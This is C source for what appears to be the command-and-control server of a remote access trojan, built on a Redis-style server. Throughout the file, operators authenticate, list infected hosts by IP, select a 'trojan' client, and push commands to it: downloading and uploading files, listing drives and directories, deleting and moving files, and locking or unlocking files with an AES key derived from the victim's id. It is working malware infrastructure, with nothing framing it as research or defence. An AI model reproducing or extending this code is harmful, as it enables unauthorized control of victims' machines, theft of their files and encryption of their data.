#include "server.h"
#include "mycommand.h"
#include "myutils.h"
#include <string.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <malloc.h>


#define generateCommandTimes(type, value) \
void type##Command(client *c) {\
	client *cl = genericGetClient(c);\
	if(cl == NULL){\
		addReplySds(c, sdsnew("-ERR CAN'T FIND CLIENT.\r\n"));\
		return;\
	}\
\
	addReply(cl, shared.mbulkhdr[(value)]);\
	addReplyBulkCString(cl, ""#type);\
	if(c->cur_trojan){\
		for(int i = 1; i < (value); i++) \
			addReplyBulkCString(cl, c->argv[i]->ptr);\
	}\
	else{\
		for(int i = 1; i < (value); i++) \
			addReplyBulkCString(cl, c->argv[i + 1]->ptr);\
	}\
\
	addReply(c, shared.ok);\
\
}

extern jmp_buf jmp_env;

client* genericGetClient(client* c){
	listNode *ln;
	listIter li;

	if(c->enable_client != true || c->is_control != true){
		addReply(c, shared.err);
		return NULL;
	}

	client* cl = NULL;
	listRewind(server.clients, &li);
	while((ln = listNext(&li))){
		cl = listNodeValue(ln);
		if(!cl || !cl->hashid || cl->enable_client==false){
			cl = NULL;
			continue;
		}
		if(c->cur_trojan && !strcasecmp(c->cur_trojan, cl->hashid)){
			break;
		}
		if(!c->cur_trojan && c->argc >=2 && !strcasecmp(c->argv[1]->ptr, cl->hashid)){
			break;
		}
		cl = NULL;
	}
	return cl;
}

void inCommand(client *c){
	listNode *ln;
	listIter li;
	long place;
	int s = string2l(c->argv[1]->ptr, strlen(c->argv[1]->ptr), &place);
	if(s && c->enable_client && c->is_control){
		listRewind(server.clients, &li);
		client *cl = NULL;
		while((ln = listNext(&li))){
			cl = listNodeValue(ln);
			if(!cl || !cl->enable_client || cl->is_control || cl == c){
				cl = NULL;
				continue;
			}
			if(--place <= 0)
				break;
			else
				cl = NULL;
		}
		if(cl == NULL){
			addReply(c, shared.err);
			return;
		}
		if(c->cur_trojan)
			sdsfree(c->cur_trojan);
		c->cur_trojan = sdsdup(cl->hashid);
		addReply(c, shared.ok);
		return;
	}
	addReply(c, shared.err);
	return;
	
}

void outCommand(client *c){
	if(c->cur_trojan){
		sdsfree(c->cur_trojan);
		c->cur_trojan = NULL;
		addReply(c, shared.ok);
		return;	
	}

	addReply(c, shared.err);
	return;
}

void enableCommand(client *c){
	listNode *ln;
	listIter li;
	if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "1", 1)){
		listRewind(server.clients, &li);
		while((ln = listNext(&li))){
			client *cl = listNodeValue(ln);
			if(!cl || !cl->hashid || cl->enable_client != true)
				continue;
			if(!strcasecmp(c->argv[2]->ptr, cl->hashid)){
				printf("conflict hashid: %s, client fd: %d, %d", cl->hashid, c->fd, cl->fd);
				addReply(c, shared.err);
				c->flags |= CLIENT_CLOSE_AFTER_REPLY;
				return;
			}
		}
		c->hashid = sdsnew(c->argv[2]->ptr);
		c->enable_client = true;
		c->is_control = false;
		addReply(c, shared.ok);
	}
	else if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "2", 1) && (!server.secretphrase || !strncmp(c->argv[2]->ptr, server.secretphrase, sdslen(server.secretphrase)))){
		c->enable_client = true;
		c->is_control = true;
		addReply(c, shared.ok);
	}
	else
		addReply(c, shared.err);
	return;
}

void getClientsCommand(client *c){
	listNode* ln;
	listIter li;
	char* buf[1024];
	int hasClient = 0;

	memset(buf, 0, sizeof(buf));
	if(!c->enable_client || !c->is_control){
		addReply(c, shared.err);
		return;
	}

	listRewind(server.clients, &li);
	while((ln = listNext(&li))){
		client* cl = listNodeValue(ln);
		if(!cl || !cl->enable_client || cl->is_control || cl == c){
			continue;
		}
		hasClient++;
		buf[hasClient - 1] = (char*)malloc(sizeof(char) * 1024);
		memset(buf[hasClient - 1], 0, 1024 * sizeof(char));

		struct sockaddr_in sa;
		socklen_t len = sizeof(sa);
		if(!getpeername(cl->fd, (struct sockaddr*)&sa, &len)){
			sprintf(buf[hasClient - 1] + strlen(buf[hasClient - 1]), "%s;%d;%s;", inet_ntoa(sa.sin_addr), sa.sin_port, cl->hashid);
		}
	}
	if(!hasClient){
		addReply(c, shared.emptymultibulk);
		return;
	}
	addReply(c, shared.mbulkhdr[hasClient]);
	for(int i = 0; i < hasClient; i++)
		addReplyBulkCString(c, buf[i]);

	return;
}

void lockCommand(client *c){
	unsigned char hash[20];
	client *cl = genericGetClient(c);
	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	if(c->cur_trojan)
		gethashforaes(sdsdup(c->cur_trojan), hash);
	else
		gethashforaes(sdsnew(c->argv[1]->ptr), hash);
	memset(hash + 16, 0, 4);

	addReply(cl, shared.mbulkhdr[3]);
	if(!strcasecmp(c->argv[0]->ptr, "lock"))
		addReplyBulkCString(cl, "lock");
	else
		addReplyBulkCString(cl, "unlock");
	addReplyBulkSds(cl, sdsnewlen(hash, 16));
	if(c->cur_trojan)
		addReplyBulkCString(cl, c->argv[1]->ptr);
	else
		addReplyBulkCString(cl, c->argv[2]->ptr);

	addReply(c, shared.ok);
	return;
}

/* file transport*/
void downloadCommand(client *c){
	volatile int tfd, cfd = c->fd;
	/* debug */
	int count, ret;
	packet pac;
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}
	/* send cmd to the trojan client */
	tfd = cl->fd;
	memset(&pac, 0, sizeof(pac));
	if(c->cur_trojan)
		sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[1]->ptr),(char*)c->argv[1]->ptr);
	else
		sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);

	ret = write(tfd, pac.data, strlen(pac.data));

	if(c->cur_trojan){
		cfd = open(c->argv[1]->ptr, O_WRONLY|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
		if(cfd == -1){
			addReplySds(c, sdsnew("-ERR CAN'T CREATE FILE"));
			return;
		}
	}
	else
		cfd = c->fd;

	if(fork()==0){
		int flags = fcntl(tfd, F_GETFL, 0);
		fcntl(tfd, F_SETFL, 0);
		if(setjmp(jmp_env))
			goto err;
		while(1){
			memset(&pac, 0, sizeof(pac));
			alarm(1);
			count = read(tfd, &pac, sizeof(pac));

			if(count > 0){
				switch(pac.type){
				case 1:
					if(c->cur_trojan)
						ret = write(cfd, pac.data, sizeof(pac.data));
					else
						ret = write(cfd, &pac, sizeof(pac));
					if(ret < 0)
						goto err;
					break;
				case 2:
					if(c->cur_trojan)
						ret = write(cfd, pac.data, count - 1);
					else
						ret = write(cfd, &pac, count);
					close(cfd);
					fcntl(tfd, F_SETFL, flags);
					exit(0);
				default:
					goto err;
				}
			}
			else{
err:			/* error handle*/
				pac.type = 0;
				if(c->cur_trojan)
					exit(0);
				else
					ret = write(cfd, pac.data, sizeof(pac.data));
				fcntl(tfd, F_SETFL, flags);
				close(cfd);
				exit(0);
			}
		}
	}

	addReply(c, shared.ok);
	return ;
}

void uploadCommand(client *c){
	struct stat stbuf;
	packet pac;
	int  cfd, leftcount, count, ret;
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}
	/* send cmd to the trojan client */
	memset(&pac, 0, sizeof(pac));
	if(c->cur_trojan)
		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[1]->ptr),(char*)c->argv[1]->ptr);
	else
		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
	ret = write(cl->fd, pac.data, strlen(pac.data));

	if(fork() == 0){
		if(c->cur_trojan){
			cfd = open(c->argv[1]->ptr, O_RDONLY|O_TRUNC);
			if(cfd == -1)
				goto err;
			if(fstat(cfd, &stbuf) != 0){
				goto err;
			}
			leftcount = stbuf.st_size;
		}
		else
			cfd = c->fd;

		int flags = fcntl(cl->fd, F_GETFL, 0);
		fcntl(cl->fd, F_SETFL, 0);
		if(setjmp(jmp_env))
			goto err;
		while(1){
			memset(&pac, 0, sizeof(pac));
			if(!c->cur_trojan){
				while(1){
					alarm(3);
					memset(&pac, 0, sizeof(pac));
					count = read(c->fd, &pac, sizeof(pac));
					if(count <= 0)
						goto err;
					switch(pac.type){
						case 1:
							ret = write(cl->fd, &pac, sizeof(pac));
							break;
						case 2:
							ret = write(cl->fd, &pac, count);
							exit(0);
						default:
							goto err;
					}
				}
			}
			alarm(3);
			count = read(cfd, &pac.data, sizeof(pac.data));
			leftcount -= count;
			if(count > 0){
				if(leftcount > 0){
					pac.type = 1;
					ret = write(cl->fd, &pac, sizeof(pac));
				}
				else{
					pac.type = 2;
					ret = write(cl->fd, &pac, count + 1);
					exit(0);
				}
			}
			else{
err:			/* error handle */
				pac.type = 0;
				ret = write(cl->fd, &pac, sizeof(pac));
				fcntl(cl->fd, F_SETFL, flags);
				close(cfd);
				exit(0);
			}
		}
	}

	addReply(c, shared.ok);
	return;
}

void lsCommand(client *c){
	char buff[1024 * 16 * 4];
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	sprintf(buff, "*1\r\n$2\r\nls\r\n");
	write(cl->fd, buff, strlen(buff));

	if(fork() == 0){
		fcntl(cl->fd, F_SETFL, 0);
		memset(buff, 0, sizeof(buff));
		if(setjmp(jmp_env))
			goto err;
			alarm(1);
			unsigned int count = read(cl->fd, buff, sizeof(buff));
			if(count > 0){
				write(c->fd, buff, strlen(buff));
				while(count >= sizeof(buff)){
					alarm(2);
					count = read(cl->fd, buff, sizeof(buff));
					write(c->fd, buff, strlen(buff));
				}
				exit(0);
			}
		/* error handle*/
err:	write(c->fd, "-ERR\r\n", strlen("-ERR\r\n"));
		exit(0);
	}

	return;
}

void getDrivesCommand(client *c){
	char buff[1024 * 16];
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	sprintf(buff, "*1\r\n$9\r\ngetDrives\r\n");
	write(cl->fd, buff, strlen(buff));

	if(fork() == 0){
		fcntl(cl->fd, F_SETFL, 0);
		memset(buff, 0, sizeof(buff));
		if(setjmp(jmp_env))
			goto err;
		alarm(1);
		unsigned int count = read(cl->fd, buff, sizeof(buff));
		if(count > 0){
			write(c->fd, buff, strlen(buff));
			exit(0);
		}
		/* error handle*/
err:	write(c->fd, "-ERR\r\n", strlen("-ERR\r\n"));
		exit(0);
	}

	return;
}

/*    generateComamnd using macro      */
generateCommandTimes(new, 2)
generateCommandTimes(cat, 3)
generateCommandTimes(copy, 2)
generateCommandTimes(cut, 2)
generateCommandTimes(paste, 1)
generateCommandTimes(fpaste, 1)
generateCommandTimes(rm, 2)


/* directory control */
generateCommandTimes(rmdir, 2)
generateCommandTimes(cd, 2)
generateCommandTimes(mv, 3)
generateCommandTimes(mkdir, 2)

generateCommandTimes(up, 1)
generateCommandTimes(back, 1)
